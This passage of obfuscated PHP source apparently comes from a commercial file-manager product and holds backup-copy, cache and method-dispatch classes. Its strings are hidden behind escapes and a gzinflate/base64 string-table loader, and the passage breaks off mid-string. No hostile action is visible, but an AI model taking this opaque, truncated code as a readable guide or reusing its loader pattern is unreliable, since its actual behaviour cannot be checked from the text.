IO::listPath($e™³ÔÇ…ã); $fêÇİ ö£’ = isset($E‘à‹”õ†[$f›™Ğè…ƒ[83]]) ? $E‘à‹”õ†[$f›™Ğè…ƒ[83]] : array(); $AñËœ’äŒÁ = array_sum(array_column($fêÇİ ö£’, $f›™Ğè…ƒ[87])); goto C‡–‹–¡Á; BÃÈÁÛ½‹ñ: $D†ÓÄ ->end(); Backup::set(array($f›™Ğè…ƒ[747] => $AñËœ’äŒÁ)); return !0; goto Eƒˆ¸òôÜ; A±é¨È‘ : $e™³ÔÇ…ã = TEMP_FILES . "\142\x61\143\x6b\x75\x70\x5f{$c§Öõ²­å‹}\57"; $dŒá°Œå‹ˆ = "\x7b\151\157\72{$Bí§²ù±ç‹[$f›™Ğè…ƒ[705]]}\175\57\x64\x61\x74\x61\142\141\x73\145\x2f\142\x61\143\x6b\x75\160\x5f{$c§Öõ²­å‹}\57"; if (!($dŒá°Œå‹ˆ = IO::mkdir($dŒá°Œå‹ˆ))) { return !1; } goto D»ŠÇäÄ½À; C‡–‹–¡Á: if (!$AñËœ’äŒÁ) { return !1; } Backup::set(array($f›™Ğè…ƒ[742] => $AñËœ’äŒÁ)); $D†ÓÄ  = new TaskFileTransfer($f›™Ğè…ƒ[743], $f›™Ğè…ƒ[727], count($fêÇİ ö£’), LNG($f›™Ğè…ƒ[728]) . $f›™Ğè…ƒ[437] . LNG($f›™Ğè…ƒ[730]) . $f›™Ğè…ƒ[744]); goto fÅ…±«Ê–ƒ; fÅ…±«Ê–ƒ: $D†ÓÄ ->task[$f›™Ğè…ƒ[712]] = $AñËœ’äŒÁ; foreach ($E‘à‹”õ†[$f›™Ğè…ƒ[83]] as $fªÅÈÜªØ) { $bƒÑ”Ö…æ‘ = IO::move($fªÅÈÜªØ[$f›™Ğè…ƒ[85]], $dŒá°Œå‹ˆ); if (!$bƒÑ”Ö…æ‘) { $D†ÓÄ ->end(); return !1; } } $e£ÃĞÎ­™è = CONTROLLER_DIR . $f›™Ğè…ƒ[745]; goto aÔÛÚ¡Ç»¶; aÔÛÚ¡Ç»¶: $dØÇÄ™‡Œ = CONTROLLER_DIR . $f›™Ğè…ƒ[746]; IO::copy($e£ÃĞÎ­™è, $dŒá°Œå‹ˆ); IO::copy($dØÇÄ™‡Œ, $dŒá°Œå‹ˆ); goto BÃÈÁÛ½‹ñ; Eƒˆ¸òôÜ: } } class BackupFile { public function __construct() { } public function index() { goto C»ß¥¥êÆÓ; BÄ£ªÀÇóÄ: $CĞ±–Å¦·İ = array($_SERVER[¢Í][764] => 1, $_SERVER[¢Í][473] => time(), $_SERVER[¢Í][722] => 1, $_SERVER[¢Í][761] => $c¼ÊË„Şƒí, $_SERVER[¢Í][753] => $E»ÎÔëœ´¢, $_SERVER[¢Í][752] => $f¾×ç›ˆ•); if ($b§ë¼°¢È¦) { $CĞ±–Å¦·İ[$_SERVER[¢Í][762]] = $cõ¦óèóÕğ; $CĞ±–Å¦·İ[$_SERVER[¢Í][763]] = $e„Ø×ÌÂìÕ; } Backup::set($CĞ±–Å¦·İ); goto dŒÏØËÏôô; dŒÏØËÏôô: $this->_fileFilter($E‚ÅË³å¶); return !0; goto fˆŠââ»Œè; B‡¦ÍÍÍÕß: $f¾×ç›ˆ• = (int) Model($_SERVER[¢Í][732])->where($BôóÒçÑ»)->count($_SERVER[¢Í][444]); $E»ÎÔëœ´¢ = (int) Model($_SERVER[¢Í][732])->where($BôóÒçÑ»)->sum($_SERVER[¢Í][87]); $cé¡®ö Û = new TaskFileTransfer($_SERVER[¢Í][750], $_SERVER[¢Í][727], $f¾×ç›ˆ•, LNG($_SERVER[¢Í][728]) . $_SERVER[¢Í][729] . LNG($_SERVER[¢Í][751])); goto CòÑŠÍ³ŞÜ; Cëóã·åâë: $DÙï÷¨ ˆ‘ = 1000; $Dùôë†æÉ´ = $b§ë¼°¢È¦ = 0; $E‚ÅË³å¶ = array(); goto D÷”Íß÷Ô; C»ß¥¥êÆÓ: $cÆÜ…ë‚ = Backup::get(); $c¼ÊË„Şƒí = $cÆÜ…ë‚[$_SERVER[¢Í][296]][$_SERVER[¢Í][181]][$_SERVER[¢Í][444]]; $BôóÒçÑ» = array($_SERVER[¢Í][445] => array($_SERVER[¢Í][748], $c¼ÊË„Şƒí), $_SERVER[¢Í][749] => array($_SERVER[¢Í][334], $cÆÜ…ë‚[$_SERVER[¢Í][705]])); goto B‡¦ÍÍÍÕß; c„í¼Öƒß£: $B¼½ï¾¾Ÿ¨ = !0; $BÖÒèáó‹“ = $this->storeIds(); $EêøÓØÈ› = 1; goto Cëóã·åâë; CòÑŠÍ³ŞÜ: $cé¡®ö Û->task[$_SERVER[¢Í][712]] = $E»ÎÔëœ´¢; $CĞ±–Å¦·İ = array($_SERVER[¢Í][752] => $f¾×ç›ˆ•, $_SERVER[¢Í][753] => $E»ÎÔëœ´¢); Backup::set($CĞ±–Å¦·İ); goto c„í¼Öƒß£; D÷”Íß÷Ô: $e„Ø×ÌÂìÕ = $cõ¦óèóÕğ = 0; do { $fÙˆ®’ğØã = $_SERVER[¢Í][754]; $E‚ğ‰å´Ñ = Model($_SERVER[¢Í][732])->where($BôóÒçÑ»)->field($fÙˆ®’ğØã)->order($_SERVER[¢Í][755])->selectPage($DÙï÷¨ ˆ‘, $EêøÓØÈ›); $C†í¬ŠÍŸë = !empty($E‚ğ‰å´Ñ[$_SERVER[¢Í][370]]) ? $E‚ğ‰å´Ñ[$_SERVER[¢Í][370]] : array(); foreach ($C†í¬ŠÍŸë as $C‘¾Ò¦è–) { goto bè±í™ï…ï; d´÷Èö¦Ä±: if ($Dùôë†æÉ´ >= 1024 * 1024 * 100) { $CĞ±–Å¦·İ = array($_SERVER[¢Í][761] => $c¼ÊË„Şƒí, $_SERVER[¢Í][762] => $cõ¦óèóÕğ, $_SERVER[¢Í][763] => $e„Ø×ÌÂìÕ); Backup::set($CĞ±–Å¦·İ); $Dùôë†æÉ´ = $b§ë¼°¢È¦ = 0; } goto d¢¦™Š³; AÅå¡²Ü£ù: if (IO::exist($c¸³å¶¸¸Î)) { $cé¡®ö Û->updateFileEnd($C‘¾Ò¦è–[$_SERVER[¢Í][28]], $C‘¾Ò¦è–[$_SERVER[¢Í][87]]); } else { $c¸³å¶¸¸Î = get_path_father($c¸³å¶¸¸Î); IO::mkdir($c¸³å¶¸¸Î); if (!IO::copy($fã÷â»Ø, $c¸³å¶¸¸Î, $_SERVER[¢Í][758])) { write_log($_SERVER[¢Í][759] . $fã÷â»Ø . $_SERVER[¢Í][760] . $c¸³å¶¸¸Î . $_SERVER[¢Í][502], $_SERVER[¢Í][727]); $B¼½ï¾¾Ÿ¨ = !1; break; } } $c¼ÊË„Şƒí = $C‘¾Ò¦è–[$_SERVER[¢Í][444]]; $b§ë¼°¢È¦ += 1; goto b³¢±ƒ„®; bè±í™ï…ï: if (!$this->_fileExist($C‘¾Ò¦è–, $E‚ÅË³å¶, $BÖÒèáó‹“)) { $f¾×ç›ˆ• -= 1; $E»ÎÔëœ´¢ -= (int) $C‘¾Ò¦è–[$_SERVER[¢Í][87]]; write_log("\x66\x69\154\145\x20\x6e\157\164\x20\145\x78\x69\x73\x74\56\146\151\154\x65\111\x44\x3a{$C‘¾Ò¦è–[$_SERVER[¢Í][444]]}\x2c\40\160\141\164\x68\72{$C‘¾Ò¦è–[$_SERVER[¢Í][85]]}", $_SERVER[¢Í][756]); continue; } $fã÷â»Ø = $C‘¾Ò¦è–[$_SERVER[¢Í][85]]; $c¸³å¶¸¸Î = "\173\151\x6f\x3a{$cÆÜ…ë‚[$_SERVER[¢Í][705]]}\175" . substr($fã÷â»Ø, strlen("\173\x69\157\x3a{$C‘¾Ò¦è–[$_SERVER[¢Í][757]]}\x7d")); goto AÅå¡²Ü£ù; b³¢±ƒ„®: $Dùôë†æÉ´ += $C‘¾Ò¦è–[$_SERVER[¢Í][87]]; $cõ¦óèóÕğ += 1; $e„Ø×ÌÂìÕ += $C‘¾Ò¦è–[$_SERVER[¢Í][87]]; goto d´÷Èö¦Ä±; d¢¦™Š³: } $eª«¼÷ò› = count($C†í¬ŠÍŸë); $EêøÓØÈ›++; } while ($eª«¼÷ò› == $DÙï÷¨ ˆ‘); $cé¡®ö Û->end(); goto BÄ£ªÀÇóÄ; fˆŠââ»Œè: } private function _fileExist($b›¶Ïšù¬ö, &$bŠÔ¥ğìÎ, $Dƒ•½‰Ÿ†) { goto A®¾ğÆšŒš; Aåê‰ÈŒğ: $bŠÔ¥ğìÎ = array_merge($bŠÔ¥ğìÎ, array_to_keyvalue($bÉ“œœÉ, $a›ÒÉøµÀˆ[33], $a›ÒÉøµÀˆ[444])); return !1; goto Aœ”ÂŠ¹Öî; FŠÙÓÅÜç: if (!in_array($b›¶Ïšù¬ö[$a›ÒÉøµÀˆ[757]], $Dƒ•½‰Ÿ†)) { return !1; } if (IO::exist($A‰×õÙ¸Ø)) { return !0; } $C‰¡¶êô«® = get_path_father($A‰×õÙ¸Ø); goto F½Ñà—Ò†Í; F½Ñà—Ò†Í: if (IO::exist($C‰¡¶êô«®)) { $bŠÔ¥ğìÎ[] = $b›¶Ïšù¬ö[$a›ÒÉøµÀˆ[444]]; return !1; } $bîá¨­…Ú¥ = array($a›ÒÉøµÀˆ[757] => $b›¶Ïšù¬ö[$a›ÒÉøµÀˆ[757]], $a›ÒÉøµÀˆ[85] => array($a›ÒÉøµÀˆ[382], "{$C‰¡¶êô«®}\45")); $bÉ“œœÉ = Model($a›ÒÉøµÀˆ[732])->where($bîá¨­…Ú¥)->field($a›ÒÉøµÀˆ[445])->select(); goto Aåê‰ÈŒğ; A®¾ğÆšŒš: $a›ÒÉøµÀˆ =& $_SERVER[¢Í]; $A‰×õÙ¸Ø = $b›¶Ïšù¬ö[$a›ÒÉøµÀˆ[85]]; if (in_array($b›¶Ïšù¬ö[$a›ÒÉøµÀˆ[444]], $bŠÔ¥ğìÎ)) { return !1; } goto FŠÙÓÅÜç; Aœ”ÂŠ¹Öî: } private function _fileFilter($dæÌŠÂ×»Ş) { $C¥¯ã¹ß²§ =& $_SERVER[¢Í]; if (empty($dæÌŠÂ×»Ş)) { return; } $EìÄÏ¸¨ß¢ = array($C¥¯ã¹ß²§[444] => array($C¥¯ã¹ß²§[7], array_unique($dæÌŠÂ×»Ş))); $a£Ø÷†‹® = Model($C¥¯ã¹ß²§[765])->where($EìÄÏ¸¨ß¢)->field($C¥¯ã¹ß²§[394])->select(); foreach ($a£Ø÷†‹® as $D¯Û†µ²ŸŠ) { Model($C¥¯ã¹ß²§[765])->remove($D¯Û†µ²ŸŠ[$C¥¯ã¹ß²§[394]], !1); } } private function storeIds() { $E‰ò·óå‚ =& $_SERVER[¢Í]; $a‘—òªŠ = Model($E‰ò·óå‚[717])->listData(); $EĞƒÄ³»‡ = array(); $b‰Ë¤ÎÙ¦¬ = $GLOBALS[$E‰ò·óå‚[6]][$E‰ò·óå‚[94]][$E‰ò·óå‚[766]]; foreach ($a‘—òªŠ as $FÒ®İÔ›öÜ) { $BæÅâÌ†íµ = strtolower($FÒ®İÔ›öÜ[$E‰ò·óå‚[100]]); if (!isset($b‰Ë¤ÎÙ¦¬[$BæÅâÌ†íµ])) { continue; } $dôíÖÚ’ØĞ = $E‰ò·óå‚[81] . (isset($b‰Ë¤ÎÙ¦¬[$BæÅâÌ†íµ]) ? $b‰Ë¤ÎÙ¦¬[$BæÅâÌ†íµ] : ucfirst($BæÅâÌ†íµ)); if (!class_exists($dôíÖÚ’ØĞ)) { continue; } $EĞƒÄ³»‡[] = $FÒ®İÔ›öÜ[$E‰ò·óå‚[392]]; } return $EĞƒÄ³»‡; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto bø¢›¼î¼; b ØÏ„ˆŞ: $E°Ã‡¥ÕŒ‡ = $GLOBALS[$FõŒŠİåìà[6]][$FõŒŠİåìà[352]]; $BÔÜĞ§œ¯ã = $E°Ã‡¥ÕŒ‡[$E°Ã‡¥ÕŒ‡[$FõŒŠİåìà[767]]]; $eôëãëƒë = $E°Ã‡¥ÕŒ‡[$FõŒŠİåìà[768]]; goto aÓİåŠ“‘õ; bø¢›¼î¼: $FõŒŠİåìà =& $_SERVER[¢Í]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto b ØÏ„ˆŞ; aÓİåŠ“‘õ: switch ($E°Ã‡¥ÕŒ‡[$FõŒŠİåìà[767]]) { case $FõŒŠİåìà[17]: self::$handle = Model($FõŒŠİåìà[769]); break; case $FõŒŠİåìà[770]: self::$handle = new CacheRedis($BÔÜĞ§œ¯ã, $eôëãëƒë); break; case $FõŒŠİåìà[771]: self::$handle = new CacheMemcached($BÔÜĞ§œ¯ã, $eôëãëƒë); break; case $FõŒŠİåìà[181]: self::$handle = new CacheFile($BÔÜĞ§œ¯ã, $eôëãëƒë); break; default: break; } return self::$handle; goto EŸ°íÕ“à”; EŸ°íÕ“à”: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($fö„¥ìò×°) { if (is_array($fö„¥ìò×°) || is_object($fö„¥ìò×°)) { $fö„¥ìò×° = json_encode($fö„¥ìò×°); } $fö„¥ìò×° = rawurlencode($fö„¥ìò×°); return md5(KOD_SITE_ID . $_SERVER[¢Í][80] . $fö„¥ìò×°); } public static function get($bôŒõš¡é) { $A”°«¤ƒéá = self::key($bôŒõš¡é); if (!isset(self::$memoryCache[$A”°«¤ƒéá])) { $Dƒùä¯ãÓ = self::init()->get($A”°«¤ƒéá); self::$memoryCache[$A”°«¤ƒéá] = unserialize($Dƒùä¯ãÓ); } return self::$memoryCache[$A”°«¤ƒéá]; } public static function set($Dä£Åˆ†‚š, $Fµï¿¥§, $dîø¾’¸öĞ = false) { goto Fİ­¹ÂÈŒå; DáÛ¶ë‚‰Ø: CacheLock::lock($Dä£Åˆ†‚š); $e×øêÉ²¬Ë = self::init()->set($b¼’“§¸‘É, serialize($Fµï¿¥§), $dîø¾’¸öĞ); self::$memoryCache[$b¼’“§¸‘É] = $Fµï¿¥§; goto f íß÷ ºì; Fİ­¹ÂÈŒå: $b¼’“§¸‘É = self::key($Dä£Åˆ†‚š); if (isset(self::$memoryCache[$b¼’“§¸‘É]) && self::$memoryCache[$b¼’“§¸‘É] === $Fµï¿¥§) { return !0; } if ($dîø¾’¸öĞ === 0) { self::$memoryCache[$b¼’“§¸‘É] = $Fµï¿¥§; return !0; } goto DáÛ¶ë‚‰Ø; f íß÷ ºì: CacheLock::unlock($Dä£Åˆ†‚š); return $e×øêÉ²¬Ë; goto Bƒ©Æ›øì; Bƒ©Æ›øì: } public static function remove($CªŸ”Ê¡«Š) { goto FÅÌ•‘ˆ; c‹¡¸œˆ: CacheLock::lock($CªŸ”Ê¡«Š); $aÇ‰¬¥Çêã = self::init()->remove($AğŸÒÂì·ë); CacheLock::unlock($CªŸ”Ê¡«Š); goto A¸±øç­Ù‘; FÅÌ•‘ˆ: $AğŸÒÂì·ë = self::key($CªŸ”Ê¡«Š); unset(self::$memoryCache[$AğŸÒÂì·ë]); self::clearTimeout(); goto c‹¡¸œˆ; A¸±øç­Ù‘: return $aÇ‰¬¥Çêã; goto a¬³÷£åÔÃ; a¬³÷£åÔÃ: } public static function removeMemory($Bï‹‹Œ›´ô) { $e»Å¡ĞŠÄ½ = self::key($Bï‹‹Œ›´ô); unset(self::$memoryCache[$e»Å¡ĞŠÄ½]); } public static function clearMemory($DÌ÷Û˜ßã = false) { if ($DÌ÷Û˜ßã) { $DÌ÷Û˜ßã = self::key($DÌ÷Û˜ßã); unset(self::$memoryCache[$DÌ÷Û˜ßã]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[¢Í][772])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[¢Í][773])) { self::init()->clearTimeout(); } } } goto e‰ë¶ğ·’£; FÑŠŠÍÓí¦: function binCheckBigger($BØĞ–ÓÂà, $bÃ£ƒŒÑ±§) { return $BØĞ–ÓÂà > $bÃ£ƒŒÑ±§; } $_SERVER[$_SERVER[ëÈ][3]] = ("\70\67\61\67"."\x32\x31")+0;$_A6Vw="3MVsxVDTkNvkTYhmINPwwb5xMzgKvwQUHEr6rFP6VNbuP7EIJ8vR4Sc5zDa4JcZGuWn2Wq37DkzBiq55";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($F‹ï…Ï½´ö, $cƒ¨Ü¯¸) { $bø“¸¥½Â« =& $_SERVER[¢Í]; if (isset(self::$_methodList[$F‹ï…Ï½´ö])) { return @call_user_func_array(self::$_methodList[$F‹ï…Ï½´ö], $cƒ¨Ü¯¸); } else { if (method_exists($this, $F‹ï…Ï½´ö)) { return call_user_func_array(array($this, $F‹ï…Ï½´ö), $cƒ¨Ü¯¸); } else { think_exception(__CLASS__ . $bø“¸¥½Â«[4] . $F‹ï…Ï½´ö . $bø“¸¥½Â«[5]); } } } public static function __callStatic($FÓ›×›ƒÍÅ, $B‘‡‹¬‘¬Ÿ) { if (isset(self::$_methodListStatic[$FÓ›×›ƒÍÅ])) { return call_user_func_array(self::$_methodListStatic[$FÓ›×›ƒÍÅ], $B‘‡‹¬‘¬Ÿ); } else { if (method_exists(self, $FÓ›×›ƒÍÅ)) { return call_user_func_array(array(self, $FÓ›×›ƒÍÅ), $B‘‡‹¬‘¬Ÿ); } else { show_json("{$FÓ›×›ƒÍÅ}\50\x29\x20\156\x6f\x74\40\145\x78\151\x73\164\x3b", !1); } } } public static function addMethod($AƒÖëˆÜ™Í, $a°†¢—Ş»Ò) { self::$_methodList[$AƒÖëˆÜ™Í] = $a°†¢—Ş»Ò; } public static function addMethodStatic($e¡ÂÉñ¥±Å, $a»ÓßáÄ) { self::$_methodListStatic[$e¡ÂÉñ¥±Å] = $a»ÓßáÄ; } } goto fĞ¤¸à†À; Dİˆ˜·ñƒ: if (!function_exists('_kodDe')) { function _kodDe($eÅƒ¼…Í°§) { $eÅƒ¼…Í°§ = base64_decode($eÅƒ¼…Í°§); $bë°õ¶ÂË¼ = strlen($eÅƒ¼…Í°§); $DÔ²Âè¦æÊ = ''; $E§ˆ“ñÕæ² = ord($eÅƒ¼…Í°§[0]) - 30; for ($e¢ß¿±ì–„ = 1; $e¢ß¿±ì–„ < $bë°õ¶ÂË¼; $e¢ß¿±ì–„ += 2) { if ($e¢ß¿±ì–„ + 1 < $bë°õ¶ÂË¼) { $DÔ²Âè¦æÊ .= chr(ord($eÅƒ¼…Í°§[$e¢ß¿±ì–„ + 1]) + $E§ˆ“ñÕæ²); $DÔ²Âè¦æÊ .= chr(ord($eÅƒ¼…Í°§[$e¢ß¿±ì–„]) + $E§ˆ“ñÕæ²); } else { $DÔ²Âè¦æÊ .= chr(ord($eÅƒ¼…Í°§[$e¢ß¿±ì–„]) + $E§ˆ“ñÕæ²); } } return $DÔ²Âè¦æÊ; } } define(strrev('Í¢'), "\xd4\xda\xef\x81\xbc\x8f\xc6"); $_SERVER[¢Í] = explode("\174\1\174\2\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\275\11\174\123\125\366\70\256\342\212\313\270\174\35\167\175\124\260\55\144\351\302\132\50\45\155\323\66\222\66\65\111\51\205"."\x94\xf0\x92\xbc\x36\xaf\x4d\xf2\xd2\xf7\x5e\x9a\xb6\x80\xfb\x2e\xa8\xa8\xb8\x81\x33\x2a\xea\xe8\x88\x2c\x3a\x6e\x8c\xb8\x8c\xe3\x36\x2e\x8c\x32\x38\x2a\x6e\xa3\x6c\x6e\x83\xcb\xb8".base64_decode('j+Pv7ve+l+B8///fjw+Qu7+7nHvuOeeec+4nzy/ed/F+iw+44LK3P37+pi23').base64_decode('b/szji/eH/zuj8OnXXHwPujPqCsuLytrmTx6QtthV/3hPvkeeY18WcD/4ku+')."\xc3\x5f\x59\x73\xa6\x77\xe7\xea\x17\x87\x77\xee\xbb\xcf\x55\xd3\x96\x1e\x5c\x3\xa\xe3\xba\x35\xf8\x47\xca\x68\xa6\xa4\xc\xa9\x86\x69\xe0\x84\xb8\x96\xe9\x51\x7b\x71\x58\xcd\xe0".base64_decode('Xzf+MQZSqqngcLQtEI6GOtrbvcFwlLQo5qe1BAllZV1Ok8azim6AT4nNRbNa')."\x56\xc9\x58\x52\x78\x42\x42\x36\xe5\x98\x6c\x90\x96\x1a\xeb\xa3\x8d\xde\x76\x7f\xa0\x2b\x1a\xee\x6a\xf7\x92\x12\xb1\xe8\x40\x4e\xd1\x87\x71\xc\x5\x43\xa6\xac\x9b\x61\x35\xad\xb0"."\x12\x79\x9d\xf5\xab\xde\xdb\xec\x6b\x93\xc2\x41\x4f\x5b\xc8\xd3\x10\xf6\x5\xda\x70\x72\x43\xa0\xb5\xd5\x17\x2e\x4c\xf\x6\xfc\xfe\x7a\x4f\xc3\xec\xc2\x9c\xf6\xa0\xa7\xb9\xd5\x23"."\201\376\245\224\250\232\351\321\312\244\205\70\147\241\124\216\3\115\252\222\112\340\140\106\246\335\61\207\263\44\24\146\41\260\6\231\134\52\205\43\155\54\104\372\257"."\xf4\xc8\xb9\x14\x99\xb3\x46\x31\x92\xd5\xd5\xb4\x4c\x87\x3e\x5b\x19\x66\xa9\x38\x20\xe7\x4c\x4d\xcd\xc4\x71\xc4\x3b\x64\xea\x32\x4f\x7\x3d\x8e\xeb\x4a\x5a\xc9\x90\xa6\x42\x5e\xbf".base64_decode('tyEswW5KTcFAq0SWIi0bpqJLnS3eoFeCXa8tRSMulXC9jjYwIZLH75f21oKp')."\244\263\264\31\134\247\110\143\201\140\243\67\50\325\167\111\174\236\342\132\72\255\145\134\240\25\260\236\246\320\125\157\60\210\3\16\2\301\176\37\134\72\22\11\64"."\65\205\274\54\106\140\125\356\121\123\112\110\35\121\174\31\173\12\216\303\130\264\127\61\243\0\372\115\360\45\2\256\365\236\220\257\41\332\356\11\267\220\231\313\146".base64_decode('3Uai33DLejypDip+NeaOqRk3BFNXjO6W0fhnIhlHUon3R+WYppsKAYZcJqVm').strrev('ØÓBi6G5¨f¯È~J^©7G*rƒ£2“Ñ,K&ìš¬fË8EÅú')."\16\47\201\34\55\255\320\224\64\250\246\221\275\17\246\142\20\7\153\147\342\337\351\244\120\14\116\323\240\242\233\121\45\23\327\22\152\206\240\213\72\62\44\262\101"."\144\63\331\250\203\131\322\111\203\232\53\256\145\207\133\265\101\141\322\375\14\33\364\150\251\204\242\363\170\26\124\27\163\310\140\54\113\326\226\113\213\105\130\24\54"."\x4e\x2a\xa1\x53\x24\xf2\x4b\x25\x2b\x49\xb3\x8a\x69\x82\x61\x18\xb4\xa7\x1d\xd9\x94\x26\x27\x42\x8a\x2e\xf4\xbe\x9\x34\x13\xc8\x99\x62\x62\xe\x15\x6b\xd2\xf4\x74\x23\x80\x0\x32"."\73\140\173\252\35\105\62\372\351\6\115\10\223\342\42\10\266\154\376\171\316\377\164\317\237\5\376\53\47\330\66\102\272\226\124\122\251\250\62\244\220\215\234\116\114"."\62\150\357\335\6\204\76\220\202\243\276\100\64\51\33\311\326\304\244\50\252\105\221\170\102\31\162\145\223\131\202\153\30\172\211\130\66\32\234\357\66\315\364\12\107".base64_decode('QUqLyylxpDicNM1sSMkkmhjgJrR8Bk1YVqEw3uiQElKr1CW11Kg1FLoArPQM').base64_decode('c8ycNNMpFqKjZWkGSzSHCEyUkLgyZJJJkqbHk7IOlq82Z/Y4p7JtmlLjsqlq')."\x19\xb7\x16\x37\x15\xd3\x69\x98\xba\x22\x93\xd6\x3c\xf1\xb8\x62\x18\xce\x6\xb0\xd3\x75\x2d\xe5\xf4\xa4\x52\x5a\xde\x19\xd0\xd5\x5e\x35\x53\x23\x8d\x27\xc7\x1\x46\x3\x4e\x88\xa2"."\x6b\x8\x16\x29\x99\x2e\x41\x48\x82\x18\x6a\x3c\xfe\x1a\xdd\x75\xac\xb4\x2e\x67\x8c\x1e\x45\x77\x7a\xc9\xb6\xa8\x91\xc0\xfa\x30\xc\x4d\x8b\x35\xaa\x46\x56\x33\x54\xd8\xbd\x1a\x49".base64_decode('Nk05noTYjTdf+wvlVYg7lIKy3qGsqisG7avU3BomjYDWFWe7Lvem5Ropm4uB')."\x99\x21\xfb\xb3\x48\x1a\x2e\x4d\xa6\xa6\x46\x8a\xc3\xa8\x43\x4a\xe7\xc\xd3\xa9\x2b\x0\xfd\xa8\x0\xd3\x91\xc5\xf3\xf5\x38\x5b\xe1\x7a\xaa\x4a\xc2\x19\x2\xa7\x9\x49\xae\xae\x98".base64_decode('KAEwkmgeTm0Jh9ujviZANLR5o62ecANBqF5T7qV99oMzgjVJE+c6wZaDgNYG')."\xc6\xca\x13\xdb\xb5\xbc\xa2\x83\xf\xd7\xf\xd7\x48\xfd\x5a\x22\xa6\xd\xb9\x68\x56\x13\x41\xec\xb4\x30\x5c\xee\xac\xe9\xc\xca\x99\x5e\x38\x3f\xb1\x61\x53\x21\xe0\x68\xc\xf6\x5a".strrev('k8YÉëI¸ú˜•r6'."\n".'~ˆd #r	éÜ) PÑƒxçò­$Ízd¯Ú\'')."\xb4\xc\xdc\x28\x70\xad\x68\x2e\xdc\x3c\x34\xcf\xef\x6b\x86\x13\xd3\xe8\x34\x40\x21\xa7\x58\x8a\xb6\xed\x57\xd3\x2a\xec\xbb\xc9\x72\xd0\x4c\x2\x5a\xa4\x99\x74\xc8\x8d\x6\x54\x1b".base64_decode('SY4viyQmlDvB/+PL50caXeO769wqr+OudFVKVRWTpXZAHKlySiKDLihRIQVm').base64_decode('/8IEwDNJ2Oa2qcOJQe9ZHd5QONrqDbcEGskXvB4S8mt4a9IRzcc/3S6OrcGa')."\373\322\162\57\70\256\173\64\236\12\143\255\232\256\130\123\370\271\320\251\46\350\221\1\243\55\212\332\233\44\343\123\141\153\161\55\245\351\162\12\142\65\12\304\12"."\305\54\275\152\17\131\37\214\100\171\44\244\246\263\24\317\231\311\134\72\46\4\335\274\53\344\273\140\345\31\166\323\330\121\6\316\176\162\250\273\111\225\161\125\115".base64_decode('FGe7Q9XgL0fQCS0tU1ICISclgbETThpvyWlRZH42mrqpwVTdUqRVMZMaWS5A')."\342\220\56\345\130\337\150\57\23\112\112\241\363\222\124\50\262\7\324\344\40\233\56\100\62\202\60\107\340\252\21\4\5\41\11\107\343\235\220\322\346\11\46\53\232".strrev('hD`?'."\r".',Z~õ•j¥€ËnÉQé]vùy•}Ê£×8I£T!	öÖ JÇ').strrev('UŸˆ#„«S€1áE1'."\0".')5/”Ó³´4õÓÓKØ_A)Çz€ÂÚ6ïÃ©¬')."\x1c\x8b\xd3\x33\x17\x62\x69\x1c\x6\x68\x39\xab\x65\xc\xc5\x49\x68\x4b\x67\x82\xe3\x73\x5c\x62\xba\xd\x99\x17\xd4\xe0\x3c\xc3\x90\x53\x4e\x8f\x38\xd3\x60\x9a\x9c\xac\xeb\xd6\xa3"."\126\12\213\47\266\217\54\43\307\333\160\142\1\113\106\317\370\366\100\210\124\250\203\251\200\60\212\51\72\351\107\173\7\311\112\13\40\324\354\15\323\363\131\46\324"."\223\247\63\104\221\155\16\24\324\325\21\231\17\256\216\166\204\64\72\224\116\161\42\317\72\34\47\137\204\160\213\257\155\166\264\65\320\350\365\107\175\155\0\23\205".base64_decode('C9M72hs9dFXF9PoApddJagfARXM8fp+9uHeuLxQOFc0CaR1eWw5gP9uD3ibf')."\134\26\155\362\171\375\215\241\150\203\247\241\205\227\151\363\264\222\110\264\7\62\200\206\333\132\76\12\220\152\210\261\221\321\101\310\22\153\214\57\21\171\266\50\245"."\362\243\34\0\300\1\251\20\240\43\303\205\214\70\32\11\241\273\343\132\216\202\41\43\24\323\24\173\244\145\262\237\144\172\370\225\341\237\162\311\23\222\314\154\224".base64_decode('4YnYMAuiYdA4IAnJ9yWC4At6EIVl6pUehquLJ3h6TLb9bXGwIXgeWAEP4vgB')."\44\240\25\211\322\115\146\0\36\304\103\273\323\303\271\355\150\240\335\33\364\100\136\75\332\31\14\264\65\223\12\371\244\102\73\340\43\323\137\106\11\46\302\262\233"._kodDe('L2YLWfDVNhpz44x8LdQ961H1YvDtDXOn6JCBDaJHclCKufNv1i/MnSBShXpOWA==')."\x5a\x8a\x6e\x50\x70\xe6\x33\x44\xc0\x98\xfd\x3e\x83\x2\xc9\x10\xc5\x3a\x13\xe8\x21\x46\x4e\x8e\x70\x60\xb6\xb7\x2d\x4a\x21\xb\xc7\x4\x68\xc4\x9\x80\x7d\xe\x4\xc9\x84\x98\x5a"."\77\145\222\160\146\320\33\242\333\133\127\6\162\52\235\56\267\153\2\201\142\5\34\116\344\363\356\5\221\374\204\262\371\316\11\256\156\20\50\37\77\13\107\111\54"."\xe2\xb2\x44\xc7\x92\xfa\x39\x9d\xd5\x86\xa4\x50\x99\x51\x57\x5e\x13\x71\x47\xdc\x65\x75\x35\xf3\x3d\xce\x11\xd9\x39\x52\xe1\x9c\xe6\xec\x9e\x10\x71\x95\x4f\x20\x9\xdd\x8b\xaa\x1c"."\x13\x97\xc0\x2\xa0\x60\xdd\xe9\xdd\xe0\xa7\x36\x52\x37\x2e\xe2\x3c\xe3\xec\x85\xb3\xe6\x47\xba\x4b\x6b\x26\x8c\x89\xb8\x4e\x8f\xe4\xbb\xc7\x97\xd7\xd1\xef\xc4\x73\x3a\x60\x0\xe3".strrev('¿Ù$\'¨N»¡23¾c^^•'."\r".'`é¡/&‹©åšˆÆh	×2EbD€K e	‰«¬Ã').strrev('ãEó)[xÆ{N-°Íí@x\'